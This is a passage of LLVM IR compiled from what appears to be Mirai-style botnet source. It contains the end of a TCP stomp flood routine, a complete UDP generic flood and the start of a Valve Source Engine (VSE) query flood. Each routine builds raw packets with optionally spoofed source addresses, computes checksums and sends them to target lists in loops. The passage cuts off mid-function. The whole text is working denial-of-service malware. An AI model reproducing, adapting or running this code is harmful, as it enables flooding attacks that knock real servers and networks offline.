; <label>:129:                                    ; preds = %125
  %130 = load i16, i16* %60, align 16
  %131 = and i16 %130, 4608
  %132 = icmp eq i16 %131, 4608
  br i1 %132, label %133, label %213

; <label>:133:                                    ; preds = %129
  %134 = load i32, i32* %5, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %135, i32 0
  store i32 %120, i32* %136, align 4
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 2
  %138 = load i32, i32* %137, align 4
  %139 = call i32 @ntohl(i32 %138) #11
  %140 = load i32, i32* %5, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %141, i32 1
  store i32 %139, i32* %142, align 4
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 3
  %144 = load i32, i32* %143, align 4
  %145 = call i32 @ntohl(i32 %144) #11
  %146 = load i32, i32* %5, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %147, i32 2
  store i32 %145, i32* %148, align 4
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 1
  %150 = load i16, i16* %149, align 2
  %151 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %147, i32 3
  store i16 %150, i16* %151, align 4
  %152 = load i16, i16* %52, align 2
  %153 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %147, i32 4
  store i16 %152, i16* %153, align 2
  %154 = call noalias i8* @malloc(i64 %62) #10
  %155 = load i32, i32* %5, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds i8*, i8** %14, i64 %156
  store i8* %154, i8** %157, align 8
  %158 = getelementptr inbounds i8, i8* %154, i64 20
  %159 = bitcast i8* %158 to %struct.tcphdr*
  %160 = getelementptr inbounds i8, i8* %154, i64 40
  store i8 69, i8* %154, align 4
  %161 = getelementptr inbounds i8, i8* %154, i64 1
  store i8 %16, i8* %161, align 1
  %162 = call zeroext i16 @htons(i16 zeroext %63) #11
  %163 = getelementptr inbounds i8, i8* %154, i64 2
  %164 = bitcast i8* %163 to i16*
  store i16 %162, i16* %164, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %18) #11
  %166 = getelementptr inbounds i8, i8* %154, i64 4
  %167 = bitcast i8* %166 to i16*
  store i16 %165, i16* %167, align 4
  %168 = getelementptr inbounds i8, i8* %154, i64 8
  store i8 %20, i8* %168, align 4
  br i1 %64, label %173, label %169

; <label>:169:                                    ; preds = %133
  %170 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %171 = getelementptr inbounds i8, i8* %154, i64 6
  %172 = bitcast i8* %171 to i16*
  store i16 %170, i16* %172, align 2
  br label %173

; <label>:173:                                    ; preds = %133, %169
  %174 = getelementptr inbounds i8, i8* %154, i64 9
  store i8 6, i8* %174, align 1
  %175 = load i32, i32* @LOCAL_ADDR, align 4
  %176 = getelementptr inbounds i8, i8* %154, i64 12
  %177 = bitcast i8* %176 to i32*
  store i32 %175, i32* %177, align 4
  %178 = load i32, i32* %5, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %179, i32 0
  %181 = load i32, i32* %180, align 4
  %182 = getelementptr inbounds i8, i8* %154, i64 16
  %183 = bitcast i8* %182 to i32*
  store i32 %181, i32* %183, align 4
  %184 = load i32, i32* %5, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %185, i32 3
  %187 = load i16, i16* %186, align 4
  %188 = bitcast i8* %158 to i16*
  store i16 %187, i16* %188, align 4
  %189 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %185, i32 4
  %190 = load i16, i16* %189, align 2
  %191 = getelementptr inbounds i8, i8* %154, i64 22
  %192 = bitcast i8* %191 to i16*
  store i16 %190, i16* %192, align 2
  %193 = load i32, i32* %5, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %194, i32 2
  %196 = load i32, i32* %195, align 4
  %197 = getelementptr inbounds i8, i8* %154, i64 24
  %198 = bitcast i8* %197 to i32*
  store i32 %196, i32* %198, align 4
  %199 = load i32, i32* %5, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %200, i32 1
  %202 = load i32, i32* %201, align 4
  %203 = getelementptr inbounds i8, i8* %154, i64 28
  %204 = bitcast i8* %203 to i32*
  store i32 %202, i32* %204, align 4
  %205 = getelementptr inbounds i8, i8* %154, i64 32
  %206 = bitcast i8* %205 to i16*
  %207 = load i16, i16* %206, align 4
  %208 = getelementptr inbounds i8, i8* %154, i64 34
  %209 = bitcast i8* %208 to i16*
  store i16 0, i16* %209, align 2
  %210 = and i16 %207, -16369
  %211 = or i16 %210, 128
  %212 = or i16 %80, %211
  store i16 %212, i16* %206, align 4
  call void @rand_str(i8* %160, i32 %37)
  br label %.loopexit152

; <label>:213:                                    ; preds = %129
  %214 = and i16 %130, 1280
  %215 = icmp eq i16 %214, 0
  br i1 %215, label %220, label %216

; <label>:216:                                    ; preds = %213
  %217 = call i32 @close(i32 %94) #10
  br label %.backedge

.backedge:                                        ; preds = %216, %224
  %218 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %219 = icmp eq i32 %218, -1
  br i1 %219, label %.loopexit152.loopexit, label %.lr.ph161

; <label>:220:                                    ; preds = %213, %125, %122, %118
  %221 = call i64 @time(i64* null) #10
  %222 = sub nsw i64 %221, %113
  %223 = icmp sgt i64 %222, 10
  br i1 %223, label %224, label %114

; <label>:224:                                    ; preds = %220
  %225 = call i32 @close(i32 %94) #10
  br label %.backedge

.loopexit152.loopexit:                            ; preds = %.backedge
  br label %.loopexit152

.loopexit152:                                     ; preds = %.loopexit152.loopexit, %.preheader151, %173
  %.1 = phi %struct.tcphdr* [ %159, %173 ], [ %.0162, %.preheader151 ], [ %.0162, %.loopexit152.loopexit ]
  %226 = load i32, i32* %5, align 4
  %227 = add nsw i32 %226, 1
  store i32 %227, i32* %5, align 4
  %228 = icmp slt i32 %227, %46
  br i1 %228, label %.preheader151, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %240
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %85, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %240
  %storemerge139160 = phi i32 [ %278, %240 ], [ 0, %.lr.ph.preheader ]
  %229 = sext i32 %storemerge139160 to i64
  %230 = getelementptr inbounds i8*, i8** %14, i64 %229
  %231 = load i8*, i8** %230, align 8
  %232 = bitcast i8* %231 to %struct.iphdr*
  %233 = getelementptr inbounds i8, i8* %231, i64 20
  %234 = getelementptr inbounds i8, i8* %231, i64 40
  br i1 %87, label %235, label %238

; <label>:235:                                    ; preds = %.lr.ph
  %236 = getelementptr inbounds i8, i8* %231, i64 4
  %237 = bitcast i8* %236 to i16*
  store i16 0, i16* %237, align 4
  br label %238

; <label>:238:                                    ; preds = %235, %.lr.ph
  br i1 %88, label %240, label %239

; <label>:239:                                    ; preds = %238
  call void @rand_str(i8* %234, i32 %37)
  br label %240

; <label>:240:                                    ; preds = %238, %239
  %241 = getelementptr inbounds i8, i8* %231, i64 10
  %242 = bitcast i8* %241 to i16*
  store i16 0, i16* %242, align 2
  %243 = bitcast i8* %231 to i16*
  %244 = call zeroext i16 @checksum_generic(i16* %243, i32 20)
  store i16 %244, i16* %242, align 2
  %245 = load i32, i32* %5, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %246, i32 1
  %248 = load i32, i32* %247, align 4
  %249 = add i32 %248, 1
  store i32 %249, i32* %247, align 4
  %250 = trunc i32 %248 to i16
  %251 = call zeroext i16 @htons(i16 zeroext %250) #11
  %252 = zext i16 %251 to i32
  %253 = getelementptr inbounds i8, i8* %231, i64 24
  %254 = bitcast i8* %253 to i32*
  store i32 %252, i32* %254, align 4
  %255 = load i32, i32* %5, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %256, i32 2
  %258 = load i32, i32* %257, align 4
  %259 = trunc i32 %258 to i16
  %260 = call zeroext i16 @htons(i16 zeroext %259) #11
  %261 = zext i16 %260 to i32
  %262 = getelementptr inbounds i8, i8* %231, i64 28
  %263 = bitcast i8* %262 to i32*
  store i32 %261, i32* %263, align 4
  %264 = getelementptr inbounds i8, i8* %231, i64 36
  %265 = bitcast i8* %264 to i16*
  store i16 0, i16* %265, align 4
  %266 = call zeroext i16 @htons(i16 zeroext %91) #11
  %267 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %232, i8* %233, i16 zeroext %266, i32 %92)
  store i16 %267, i16* %265, align 4
  %268 = getelementptr inbounds i8, i8* %231, i64 22
  %269 = bitcast i8* %268 to i16*
  %270 = load i16, i16* %269, align 2
  %271 = load i32, i32* %5, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 0, i32 1
  store i16 %270, i16* %273, align 2
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 0
  %275 = bitcast %struct.sockaddr_in* %274 to %struct.sockaddr*
  %276 = call i64 @sendto(i32 %40, i8* %231, i64 %93, i32 16384, %struct.sockaddr* %275, i32 16) #10
  %277 = load i32, i32* %5, align 4
  %278 = add nsw i32 %277, 1
  store i32 %278, i32* %5, align 4
  %279 = icmp slt i32 %278, %46
  br i1 %279, label %.lr.ph, label %.loopexit.loopexit

.loopexit150.loopexit:                            ; preds = %114
  br label %.loopexit150

.loopexit150:                                     ; preds = %.loopexit150.loopexit, %4, %81
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %22 = trunc i32 %21 to i16
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = load i32, i32* @LOCAL_ADDR, align 4
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %25)
  %27 = and i32 %21, 65535
  %28 = icmp ugt i32 %27, 1460
  %. = select i1 %28, i16 1460, i16 %22
  %29 = tail call i32 @socket(i32 2, i32 3, i32 17) #10
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %148, label %31

; <label>:31:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %32 = bitcast i32* %5 to i8*
  %33 = call i32 @setsockopt(i32 %29, i32 0, i32 3, i8* nonnull %32, i32 4) #10
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %42, label %.preheader84

.preheader84:                                     ; preds = %31
  store i32 0, i32* %5, align 4
  %35 = zext i8 %0 to i32
  %36 = icmp eq i8 %0, 0
  br i1 %36, label %.preheader, label %.lr.ph86

.lr.ph86:                                         ; preds = %.preheader84
  %37 = add i16 %., 28
  %38 = icmp eq i8 %16, 0
  %39 = add i16 %., 8
  %.promoted = load i32, i32* %5, align 4
  %40 = sext i32 %.promoted to i64
  %41 = zext i8 %0 to i64
  br label %59

; <label>:42:                                     ; preds = %31
  %43 = call i32 @close(i32 %29) #10
  br label %148

..preheader_crit_edge:                            ; preds = %75
  %44 = trunc i64 %indvars.iv.next to i32
  store i32 %44, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader84, %..preheader_crit_edge
  %45 = icmp eq i8 %0, 0
  %46 = icmp eq i32 %26, -1
  %47 = and i32 %11, 65535
  %48 = icmp eq i32 %47, 65535
  %49 = and i32 %17, 65535
  %50 = icmp eq i32 %49, 65535
  %51 = and i32 %19, 65535
  %52 = icmp eq i32 %51, 65535
  %53 = icmp eq i8 %24, 0
  %54 = zext i16 %. to i64
  %55 = add nuw nsw i64 %54, 8
  %56 = trunc i64 %55 to i32
  %57 = add nuw nsw i64 %54, 28
  %58 = zext i16 %. to i32
  br label %.loopexit

; <label>:59:                                     ; preds = %.lr.ph86, %75
  %indvars.iv = phi i64 [ %40, %.lr.ph86 ], [ %indvars.iv.next, %75 ]
  %60 = call noalias i8* @calloc(i64 1510, i64 1) #10
  %61 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %60, i8** %61, align 8
  %62 = getelementptr inbounds i8, i8* %60, i64 20
  store i8 69, i8* %60, align 4
  %63 = getelementptr inbounds i8, i8* %60, i64 1
  store i8 %10, i8* %63, align 1
  %64 = call zeroext i16 @htons(i16 zeroext %37) #11
  %65 = getelementptr inbounds i8, i8* %60, i64 2
  %66 = bitcast i8* %65 to i16*
  store i16 %64, i16* %66, align 2
  %67 = call zeroext i16 @htons(i16 zeroext %12) #11
  %68 = getelementptr inbounds i8, i8* %60, i64 4
  %69 = bitcast i8* %68 to i16*
  store i16 %67, i16* %69, align 4
  %70 = getelementptr inbounds i8, i8* %60, i64 8
  store i8 %14, i8* %70, align 4
  br i1 %38, label %75, label %71

; <label>:71:                                     ; preds = %59
  %72 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %73 = getelementptr inbounds i8, i8* %60, i64 6
  %74 = bitcast i8* %73 to i16*
  store i16 %72, i16* %74, align 2
  br label %75

; <label>:75:                                     ; preds = %59, %71
  %76 = getelementptr inbounds i8, i8* %60, i64 9
  store i8 17, i8* %76, align 1
  %77 = getelementptr inbounds i8, i8* %60, i64 12
  %78 = bitcast i8* %77 to i32*
  store i32 %26, i32* %78, align 4
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %80 = load i32, i32* %79, align 4
  %81 = getelementptr inbounds i8, i8* %60, i64 16
  %82 = bitcast i8* %81 to i32*
  store i32 %80, i32* %82, align 4
  %83 = call zeroext i16 @htons(i16 zeroext %18) #11
  %84 = bitcast i8* %62 to i16*
  store i16 %83, i16* %84, align 2
  %85 = call zeroext i16 @htons(i16 zeroext %20) #11
  %86 = getelementptr inbounds i8, i8* %60, i64 22
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = call zeroext i16 @htons(i16 zeroext %39) #11
  %89 = getelementptr inbounds i8, i8* %60, i64 24
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %91 = icmp slt i64 %indvars.iv.next, %41
  br i1 %91, label %59, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %125
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %45, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %125
  %storemerge8385 = phi i32 [ %146, %125 ], [ 0, %.lr.ph.preheader ]
  %92 = sext i32 %storemerge8385 to i64
  %93 = getelementptr inbounds i8*, i8** %8, i64 %92
  %94 = load i8*, i8** %93, align 8
  %95 = bitcast i8* %94 to %struct.iphdr*
  %96 = getelementptr inbounds i8, i8* %94, i64 20
  %97 = getelementptr inbounds i8, i8* %94, i64 28
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %92, i32 2
  %99 = load i8, i8* %98, align 4
  %100 = icmp ult i8 %99, 32
  br i1 %100, label %101, label %108

; <label>:101:                                    ; preds = %.lr.ph
  %102 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %92, i32 1
  %103 = load i32, i32* %102, align 4
  %104 = call i32 @ntohl(i32 %103) #11
  %105 = call i32 @htonl(i32 %104) #11
  %106 = getelementptr inbounds i8, i8* %94, i64 16
  %107 = bitcast i8* %106 to i32*
  store i32 %105, i32* %107, align 4
  br label %108

; <label>:108:                                    ; preds = %101, %.lr.ph
  br i1 %46, label %109, label %112

; <label>:109:                                    ; preds = %108
  %110 = getelementptr inbounds i8, i8* %94, i64 12
  %111 = bitcast i8* %110 to i32*
  store i32 0, i32* %111, align 4
  br label %112

; <label>:112:                                    ; preds = %109, %108
  br i1 %48, label %113, label %116

; <label>:113:                                    ; preds = %112
  %114 = getelementptr inbounds i8, i8* %94, i64 4
  %115 = bitcast i8* %114 to i16*
  store i16 0, i16* %115, align 4
  br label %116

; <label>:116:                                    ; preds = %113, %112
  br i1 %50, label %117, label %119

; <label>:117:                                    ; preds = %116
  %118 = bitcast i8* %96 to i16*
  store i16 0, i16* %118, align 2
  br label %119

; <label>:119:                                    ; preds = %117, %116
  br i1 %52, label %120, label %123

; <label>:120:                                    ; preds = %119
  %121 = getelementptr inbounds i8, i8* %94, i64 22
  %122 = bitcast i8* %121 to i16*
  store i16 0, i16* %122, align 2
  br label %123

; <label>:123:                                    ; preds = %120, %119
  br i1 %53, label %125, label %124

; <label>:124:                                    ; preds = %123
  call void @rand_str(i8* %97, i32 %58)
  br label %125

; <label>:125:                                    ; preds = %123, %124
  %126 = getelementptr inbounds i8, i8* %94, i64 10
  %127 = bitcast i8* %126 to i16*
  store i16 0, i16* %127, align 2
  %128 = bitcast i8* %94 to i16*
  %129 = call zeroext i16 @checksum_generic(i16* %128, i32 20)
  store i16 %129, i16* %127, align 2
  %130 = getelementptr inbounds i8, i8* %94, i64 26
  %131 = bitcast i8* %130 to i16*
  store i16 0, i16* %131, align 2
  %132 = getelementptr inbounds i8, i8* %94, i64 24
  %133 = bitcast i8* %132 to i16*
  %134 = load i16, i16* %133, align 2
  %135 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %95, i8* %96, i16 zeroext %134, i32 %56)
  store i16 %135, i16* %131, align 2
  %136 = getelementptr inbounds i8, i8* %94, i64 22
  %137 = bitcast i8* %136 to i16*
  %138 = load i16, i16* %137, align 2
  %139 = load i32, i32* %5, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %140, i32 0, i32 1
  store i16 %138, i16* %141, align 2
  %142 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %140, i32 0
  %143 = bitcast %struct.sockaddr_in* %142 to %struct.sockaddr*
  %144 = call i64 @sendto(i32 %29, i8* %94, i64 %57, i32 16384, %struct.sockaddr* %143, i32 16) #10
  %145 = load i32, i32* %5, align 4
  %146 = add nsw i32 %145, 1
  store i32 %146, i32* %5, align 4
  %147 = icmp slt i32 %146, %35
  br i1 %147, label %.lr.ph, label %.loopexit.loopexit

; <label>:148:                                    ; preds = %4, %42
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = zext i8 %0 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 27015)
  %21 = trunc i32 %20 to i16
  tail call void @table_unlock_val(i8 zeroext 20)
  %22 = call i8* @table_retrieve_val(i32 20, i32* nonnull %6)
  %23 = call i32 @socket(i32 2, i32 3, i32 17) #10
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %147, label %25

; <label>:25:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %26 = bitcast i32* %5 to i8*
  %27 = call i32 @setsockopt(i32 %23, i32 0, i32 3, i8* nonnull %26, i32 4) #10
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %32, label %.preheader71

.preheader71:                                     ; preds = %25
  store i32 0, i32* %5, align 4
  %29 = zext i8 %0 to i32
  %30 = icmp eq i8 %0, 0
  br i1 %30, label %.preheader, label %.lr.ph73

.lr.ph73:                                         ; preds = %.preheader71
  %31 = icmp eq i8 %17, 0
  br label %41

; <label>:32:                                     ; preds = %25
  %33 = call i32 @close(i32 %23) #10
  br label %147

.preheader.loopexit:                              ; preds = %63
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader71
  %34 = icmp eq i8 %0, 0
  %35 = and i32 %12, 65535
  %36 = icmp eq i32 %35, 65535
  %37 = and i32 %18, 65535
  %38 = icmp eq i32 %37, 65535
  %39 = and i32 %20, 65535
  %40 = icmp eq i32 %39, 65535
  br label %.loopexit

; <label>:41:                                     ; preds = %.lr.ph73, %63
  %42 = call noalias i8* @calloc(i64 128, i64 1) #10
  %43 = load i32, i32* %5, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8*, i8** %9, i64 %44
  store i8* %42, i8** %45, align 8
  %46 = getelementptr inbounds i8, i8* %42, i64 20
  %47 = getelementptr inbounds i8, i8* %42, i64 28
  store i8 69, i8* %42, align 4
  %48 = getelementptr inbounds i8, i8* %42, i64 1
  store i8 %11, i8* %48, align 1
  %49 = load i32, i32* %6, align 4
  %50 = trunc i32 %49 to i16
  %51 = add i16 %50, 32
  %52 = call zeroext i16 @htons(i16 zeroext %51) #11
  %53 = getelementptr inbounds i8, i8* %42, i64 2
  %54 = bitcast i8* %53 to i16*
  store i16 %52, i16* %54, align 2
  %55 = call zeroext i16 @htons(i16 zeroext %13) #11
  %56 = getelementptr inbounds i8, i8* %42, i64 4
  %57 = bitcast i8* %56 to i16*
  store i16 %55, i16* %57, align 4
  %58 = getelementptr inbounds i8, i8* %42, i64 8
  store i8 %15, i8* %58, align 4
  br i1 %31, label %63, label %59

; <label>:59:                                     ; preds = %41
  %60 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %61 = getelementptr inbounds i8, i8* %42, i64 6
  %62 = bitcast i8* %61 to i16*
  store i16 %60, i16* %62, align 2
  br label %63

; <label>:63:                                     ; preds = %41, %59
  %64 = getelementptr inbounds i8, i8* %42, i64 9
  store i8 17, i8* %64, align 1
  %65 = load i32, i32* @LOCAL_ADDR, align 4
  %66 = getelementptr inbounds i8, i8* %42, i64 12
  %67 = bitcast i8* %66 to i32*
  store i32 %65, i32* %67, align 4
  %68 = load i32, i32* %5, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %69, i32 1
  %71 = load i32, i32* %70, align 4
  %72 = getelementptr inbounds i8, i8* %42, i64 16
  %73 = bitcast i8* %72 to i32*
  store i32 %71, i32* %73, align 4
  %74 = call zeroext i16 @htons(i16 zeroext %19) #11
  %75 = bitcast i8* %46 to i16*
  store i16 %74, i16* %75, align 2
  %76 = call zeroext i16 @htons(i16 zeroext %21) #11
  %77 = getelementptr inbounds i8, i8* %42, i64 22
  %78 = bitcast i8* %77 to i16*
  store i16 %76, i16* %78, align 2
  %79 = load i32, i32* %6, align 4
  %80 = trunc i32 %79 to i16
  %81 = add i16 %80, 12
  %82 = call zeroext i16 @htons(i16 zeroext %81) #11
  %83 = getelementptr inbounds i8, i8* %42, i64 24
  %84 = bitcast i8* %83 to i16*
  store i16 %82, i16* %84, align 2
  %85 = bitcast i8* %47 to i32*
  store i32 -1, i32* %85, align 4
  %86 = getelementptr inbounds i8, i8* %42, i64 32
  %87 = load i32, i32* %6, align 4
  call void @util_memcpy(i8* %86, i8* %22, i32 %87) #10
  %88 = load i32, i32* %5, align 4
  %89 = add nsw i32 %88, 1
  store i32 %89, i32* %5, align 4
  %90 = icmp slt i32 %89, %29
  br i1 %90, label %41, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %117
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %34, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %117
  %storemerge7072 = phi i32 [ %145, %117 ], [ 0, %.lr.ph.preheader ]
  %91 = sext i32 %storemerge7072 to i64
  %92 = getelementptr inbounds i8*, i8** %9, i64 %91
  %93 = load i8*, i8** %92, align 8
  %94 = bitcast i8* %93 to %struct.iphdr*
  %95 = getelementptr inbounds i8, i8* %93, i64 20
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %91, i32 2
  %97 = load i8, i8* %96, align 4
  %98 = icmp ult i8 %97, 32
  br i1 %98, label %99, label %106

; <label>:99:                                     ; preds = %.lr.ph
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %91, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = call i32 @ntohl(i32 %101) #11
  %103 = call i32 @htonl(i32 %102) #11
  %104 = getelementptr inbounds i8, i8* %93, i64 16
  %105 = bitcast i8* %104 to i32*
  store i32 %103, i32* %105, align 4
  br label %106

; <label>:106:                                    ; preds = %99, %.lr.ph
  br i1 %36, label %107, label %110

; <label>:107:                                    ; preds = %106
  %108 = getelementptr inbounds i8, i8* %93, i64 4
  %109 = bitcast i8* %108 to i16*
  store i16 0, i16* %109, align 4
  br label %110

; <label>:110:                                    ; preds = %107, %106
  br i1 %38, label %111, label %113

; <label>:111:                                    ; preds = %110
  %112 = bitcast i8* %95 to i16*
  store i16 0, i16* %112, align 2
  br label %113

; <label>:113:                                    ; preds = %111, %110
  br i1 %40, label %114, label %117

; <label>:114:                                    ; preds = %113
  %115 = getelementptr inbounds i8, i8* %93, i64 22
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  br label %117

; <label>:117:                                    ; preds = %114, %113
  %118 = getelementptr inbounds i8, i8* %93, i64 10
  %119 = bitcast i8* %118 to i16*
  store i16 0, i16* %119, align 2
  %120 = bitcast i8* %93 to i16*
  %121 = call zeroext i16 @checksum_generic(i16* %120, i32 20)
  store i16 %121, i16* %119, align 2
  %122 = getelementptr inbounds i8, i8* %93, i64 26
  %123 = bitcast i8* %122 to i16*
  store i16 0, i16* %123, align 2
  %124 = getelementptr inbounds i8, i8* %93, i64 24
  %125 = bitcast i8* %124 to i16*
  %126 = load i16, i16* %125, align 2
  %127 = load i32, i32* %6, align 4
  %128 = add i32 %127, 12
  %129 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %94, i8* %95, i16 zeroext %126, i32 %128)
  store i16 %129, i16* %123, align 2
  %130 = getelementptr inbounds i8, i8* %93, i64 22
  %131 = bitcast i8* %130 to i16*
  %132 = load i16, i16* %131, align 2
  %133 = load i32, i32* %5, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %134, i32 0, i32 1
  store i16 %132, i16* %135, align 2
  %136 = load i32, i32* %6, align 4
  %137 = sext i32 %136 to i64
  %138 = add nsw i64 %137, 32
  %139 = load i32, i32* %5, align 4
  %140 = sext i32 %139 to i64
